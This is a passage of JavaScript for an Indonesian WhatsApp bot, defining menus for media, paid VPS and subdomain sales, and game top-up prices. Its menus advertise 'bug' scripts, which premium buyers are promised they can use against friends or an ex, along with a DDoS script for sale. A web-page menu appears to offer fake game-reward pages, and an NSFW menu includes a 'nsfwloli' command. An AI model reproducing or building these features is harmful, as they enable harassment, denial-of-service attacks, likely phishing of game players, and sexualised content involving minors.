⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak})
}
break 
case "tiktokrandomenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*      
  ▭▬▭( *TIKTOK RANDOM* )▭▬▭

⭔ ${prefix}tiktokgirl
⭔ ${prefix}tiktokghea
⭔ ${prefix}tiktokbocil
⭔ ${prefix}tiktoknukhty
⭔ ${prefix}tiktoksantuy
⭔ ${prefix}tiktokkayes
⭔ ${prefix}tiktokpanrika
⭔ ${prefix}tiktoknotnot
⭔ ${prefix}chinese
⭔ ${prefix}hijab
⭔ ${prefix}indo
⭔ ${prefix}japanese
⭔ ${prefix}korean
⭔ ${prefix}malay
⭔ ${prefix}randomgirl
⭔ ${prefix}randomboy
⭔ ${prefix}thai
⭔ ${prefix}vietnamese
⭔ ${prefix}aesthetic
⭔ ${prefix}antiwork
⭔ ${prefix}blackpink
⭔ ${prefix}bike
⭔ ${prefix}boneka
⭔ ${prefix}cosplay
⭔ ${prefix}cat
⭔ ${prefix}doggo
⭔ ${prefix}justina
⭔ ${prefix}kayes
⭔ ${prefix}kpop
⭔ ${prefix}notnot

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬` 
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak})
}
break 
  case "otomatismenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}buysc
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buyowner

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break 

case "domainmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOMAIN MENU* )▭▬▭

⭔ ${prefix}subdomain 
⭔ ${prefix}addgc
⭔ ${prefix}delgc

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'subdomain':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*} 👋*

▭▬▭( *LIST DOMAIN PRIVATE* )▭▬▭

┏━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain1 panellstore.com
┣ ${prefix}domain2 panellstore.net
┣ ${prefix}domain3 panellstore.icu
┣ ${prefix}domain4 panellstore.xyz
┣ ${prefix}domain5 panellstore.art
┣ ${prefix}domain6 panellkuu.com
┣ ${prefix}domain7 jasa-panel.my.id 
┣ ${prefix}domain8 didinsec.biz.id 
┣ ${prefix}domain9 putraoffc.cfd 
┣ ${prefix}domain10 sellerpannel.my.id 
┣ ${prefix}domain11 pannelku.icu
┣ ${prefix}domain12 pannelku.cfd
┣ ${prefix}domain13 putraoffc.site
┣ ${prefix}domain14 putraoffc.com 
┣ ${prefix}domain15 kangpannel.xyz 
┣ ${prefix}domain16 mypannelku.com 
┣ ${prefix}domain17 pannelmurah.xyz
┣ ${prefix}domain18 storepannel.xyz
┣ ${prefix}domain19 tokopannel.xyz
┣ ${prefix}domain20 mypannel.cfd
┣ ${prefix}domain21 adminpannel.xyz
┣ ${prefix}domain22 mypannel.icu
┣ ${prefix}domain23 tokocpannelmurah.xyz
┣ ${prefix}domain24 websitepannelmurah.com
┣ ${prefix}domain25 panellku.my.id
┣ ${prefix}domain26 panellku.me 
┣ ${prefix}domain27 panellku.biz.id 
┣ ${prefix}domain28 panellku.tech 
┣ ${prefix}domain29 panelkuu.xyz
┣ ${prefix}domain30 panellku.com
┣ ${prefix}domain31 biistoreee.tech
┣ ${prefix}domain32 biistoreee.xyz 
┣ ${prefix}domain33 rulzxyxd.com 
┣ ${prefix}domain34 rafatharoffc.dev
┣ ${prefix}domain35 rafatharoffcial.dev
┣ ${prefix}domain36 rizalshop.my.id
┣ ${prefix}domain37 panelku.link
┣ ${prefix}domain38 sanzyy.xyz
┣ ${prefix}domain39 home-panel.pw ( prem )
┣ ${prefix}domain40 aswinxd.me
┣ ${prefix}domain41 panel-zall.me ( prem )
┣ ${prefix}domain42 digital-market.me
┣ ${prefix}domain43 rafatharofficial.my.id
┣ ${prefix}domain44 tokodigital.software
┣ ${prefix}domain45 agen-panell.tech ( prem )
┣ ${prefix}domain46 privateyour.me ( owner )
┣ ${prefix}domain47 crazyyhosting.xyz
┣ ${prefix}domain48 servershop.biz.id
┣ ${prefix}domain49 rumahpanel.xyz ( prem ) 
┣ ${prefix}domain50 controlpanel.site ( prem )
┣ ${prefix}domain51 sellerpanel.me ( prem )
┣ ${prefix}domain52 panelstoree.tech ( prem )
┣ ${prefix}domain53 toko-pannelmurah.biz.id ( prem )
┣ ${prefix}domain54 vvip-pannel.online ( prem ) 
┣ ${prefix}domain55 rafatharoffcial-private.me ( prem )
┣ ${prefix}domain56 amaliasyva-private.tech ( prem )
┣ ${prefix}domain57 kangpane.me ( prem )
┣ ${prefix}domain58 rizalxalfi.com ( prem )
┗━━━━━━━━━━━━━━━━━━━

*NOTE :*

*> JOIN SUBDO? PM SanZ Offcial*
*wa.me/6287818371699*
*> DOMAIN PRIVATE KHUSUS OWNER!*
*> DOMAIN PREM ( ANTI DDOS )*
*> JADI BIASA SUBDO 10K*
*> JADI PREM SUBDO 20K*

*PERINGATAN :*

*> NO PAMER DOMAIN ANTI DDOS! KETAHUAN KICK NO REFF!!!*

 *Powered By* *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "webpmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *WEBP MENU* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}webp1 (MediaFire Cahyo)
⭔ ${prefix}webp2 (MediaFire File)
⭔ ${prefix}webp3 (Grup wa 18+)
⭔ ${prefix}webp4 (Codashop FF)
⭔ ${prefix}webp5 (FF Spin SG)
⭔ ${prefix}webp6 (FF Claim)
⭔ ${prefix}webp7 (Pubgm12)
⭔ ${prefix}webp8 (Mobile-Legends)
⭔ ${prefix}webp9 (Simontok Full Info)
⭔ ${prefix}bahanYT
⭔ ${prefix}bahantwit
⭔ ${prefix}addgcweb

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "vpsmenu":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

╭─━─━─〘 *VPS MENU* 〙─━─━─━
│
│⭔ ${prefix}vpsdo
│⭔ ${prefix}vpslinode
│⭔ ${prefix}listvps1 (list harga vps linode)
│⭔ ${prefix}listvps2 (list harga vps Digital Ocean)
│
╰━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━

`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "vpsdo":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *VPS DO* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}deldroplet
⭔ ${prefix}svps / sendvps
⭔ ${prefix}sdomain / sendomain
⭔ ${prefix}ceksaldodo
⭔ ${prefix}listdroplet
⭔ ${prefix}cekdroplet
⭔ ${prefix}turnoff
⭔ ${prefix}turnon
⭔ ${prefix}sisadroplet
⭔ ${prefix}rebuild
⭔ ${prefix}restartvps
⭔ ${prefix}vps1g1c
⭔ ${prefix}vps2g1c
⭔ ${prefix}vps4g2c
⭔ ${prefix}vps8g4c
⭔ ${prefix}listvps1 (list harga DigitalOcean)
⭔ ${prefix}listvps2 (list harga Linode)

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "buyvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textvps = `*Hi @${sender.split("@")[0]} 👋*
*── 「 SanZ Offcial 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST VPS DIGITALOCEAN ｣*

⭔●${prefix}buypaketvps1g1c
⭔●${prefix}buypaketvps2g1c
⭔●${prefix}buypaketvps2g2c
⭔●${prefix}buypaketvps4g2c
⭔●${prefix}buypaketvps8g4c


_*NOTE:*_ pilih salah satu yang saldo kamu cukup
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "dmff": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*
▬▭▬▭( *LIST DM EPEP* )▭▬▭▬▭

💎 20 = Rp 3.618
💎 50 = Rp 6.996
💎 70 = Rp 9.229
💎 80 = Rp 10.746
💎 90 = Rp 12.748
💎 100 = Rp 13.559
💎 120 = Rp 16.184
💎 130 = Rp 17.628
💎 140 = Rp 18.360
💎 150 = Rp 20.876
💎 160 = Rp 21.984
💎 180 = Rp 24.531
💎 190 = Rp 25.333
💎 200 = Rp 26.814
💎 210 = Rp 27.506,
💎 250 = Rp 32.726
💎 280 = Rp 35.697
💎 300 = Rp 40.165
💎 355 = Rp 45.576
💎 425 = Rp 55.983
💎 500 = Rp 65.866
💎 720 = Rp 90.877
💎 1000 = Rp 125.102
💎 1075 = Rp 135.283
💎 2000 = Rp 256.745
💎 4000 = Rp 500.363
💎 7290 = Rp 910.401

💳MEMBER MINGGUAN: 28.000
💳MEMBER BULANAN:-

*_Kesalahan ID/ID SERVER Bukan Tanggung Jawab Admin!_*

*JIKA MINAT CHAT ADMIN Reyz Hayanasi*

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break

case "dmml": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*
▬▭▬▭( *LIST DM ML* )▭▬▭▬▭

💎 50 = Rp 12.815
💎 60 = Rp 16.170
💎 70 = Rp 16.238
💎 86 = Rp 20.024
💎 100 = Rp 25.300
💎 140 = Rp 33.413
💎 150 = Rp 37.271
💎 172 = Rp 40.858
💎 257 = Rp 58.300
💎 284 = Rp 63.782
💎 300 = Rp 68.943
💎 344 = Rp 77.410
💎 350 = Rp 80.574
💎 429 = Rp 94.121
💎 500 = Rp 115.354
💎 565 = Rp 127.809
💎 600 = Rp 134.552
💎 710 = Rp 155.089
💎 760 = Rp 168.915
💎 792 = Rp 174.064
💎 850 = Rp 184.824
💎 882 = Rp 198.756
💎 966 = Rp 213.242
💎 1000 = Rp 220.495
💎 1050 = Rp 230.847
💎 1135 = Rp 250.204
💎 1220 = Rp 270.215
💎 1416 = Rp 308.405
💎 2010 = Rp 438.254
💎 2500 = Rp 540.277
💎 3024 = Rp 755.848
💎 5545 = Rp 1.084.996
💎 6000 = Rp 1.265.471

WEEKLY DIAMOND PASS= Rp 27.088

-------------------------------
*DM LEGAL AMAN*
-------------------------------

_Kesalahan ID/ID SERVER Bukan Tanggung Jawab Admin!_

*JIKA MINAT CHAT ADMIN Reyz Hayanasi*

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "panel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

Wexx Official 
BY Wexx Official

CARA ADD USER PANEL :
ram user,nomer

contoh server : 1gb adit,62895332111099

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buysrv": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Wexx Official 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI*_
⭔●${prefix}srvpaket7 _*Ram 6GB/6GB*_
⭔●${prefix}srvpaket8 _*Ram 7GB/7GB*_
⭔●${prefix}srvpaket9 _*Ram 8GB/8GB*_
⭔●${prefix}srvpaket10 _*Ram 9GB/9GB*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup Yaa Gausah Ngelunjak 

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 
 case "buyowner":
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 20000, db_saldo)
break
        case "buyprem":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
case "buysc": case "cekharga": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY SCRIPT* )▭▬▭

*Mau Buy Sc? Pilih Sc Dibawah Ini* :

*Sc Bug v1 10k*
*Sc Bug v2 25k*
*Sc Bug v3 35k*
*Sc Hw 19 15k*
*Sc Hw 19 Fitur Jpm 20k*
*Sc Hw 19 Fitur Jpm + Cpanel 25k*
*Sc Campuran v2 15k*
*Sc Campuran v3 25k*
*Sc Campuran v3 + Subdo 30k*
*Sc Campuran v4 35k*
*Sc Campuran v5 40k*
*Sc Campuran v6 60k*
*Sc Campuran v6 + Subdo 70k*
*Sc Campuran v7 + otp 75k*
*Sc Campuran v7 + addpm2 85k*
*Sc Campuran v8 90k* ( Free Panel Unli )
*Sc Cvps v1 50k*
*Sc Cvps v2 80k* ( Free Panel Unli )
*Sc Jaga Grupv1 10k*
*Sc Jaga Grupv2 15k*
*Sc Pushkontak 10k*
*Sc PushAutoSave 15k*
*Sc Jpm X PushKntk v1 15k*
*Sc Jpm X PushKntk v2 20k*
*Sc Jpm X PushKntk v3 25k*
*Sc Themav1 10k*
*Sc Themav2 15k*
*Sc Nowa 20k*
*Sc Webp 10k*
*Sc Tesmoni 15k*
*Sc Ddos 20k*
*Sc Buka Enc 15k*
*Module 15k*
*Admin Panel 15k ( Garansi 7Day )*
*All Vps ( Pm Owner )*
*Sc yg lain?,,pm admin*

*Usahakan Saldo Mu Mencukupi Ya Kak🙏*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'nsfwmenu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 Anime NSFW 』
┆❏⭔●${prefix}hentai 🅕
┆❏⭔●${prefix}gifhentai 🅕
┆❏⭔●${prefix}gifblowjob 🅕
┆❏⭔●${prefix}hentaivid 🅕
┆❏⭔●${prefix}hneko 🅕
┆❏⭔●${prefix}nwaifu 🅕
┆❏⭔●${prefix}animespank 🅕
┆❏⭔●${prefix}trap 🅕
┆❏⭔●${prefix}gasm 🅕
┆❏⭔●${prefix}ahegao 🅕
┆❏⭔●${prefix}ass 🅕
┆❏⭔●${prefix}bdsm 🅕
┆❏⭔●${prefix}blowjob 🅕
┆❏⭔●${prefix}cuckold 🅕
┆❏⭔●${prefix}cum 🅕
┆❏⭔●${prefix}milf 🅕
┆❏⭔●${prefix}eba 🅕
┆❏⭔●${prefix}ero 🅕
┆❏⭔●${prefix}femdom 🅕
┆❏⭔●${prefix}foot 🅕
┆❏⭔●${prefix}gangbang 🅕
┆❏⭔●${prefix}glasses 🅕
┆❏⭔●${prefix}jahy 🅕
┆❏⭔●${prefix}masturbation 🅕
┆❏⭔●${prefix}manga 🅕
┆❏⭔●${prefix}neko-hentai 🅕
┆❏⭔●${prefix}neko-hentai2 🅕
┆❏⭔●${prefix}nsfwloli 🅕
┆❏⭔●${prefix}orgy 🅕
┆❏⭔●${prefix}panties 🅕 
┆❏⭔●${prefix}pussy 🅕
┆❏⭔●${prefix}tentacles 🅕
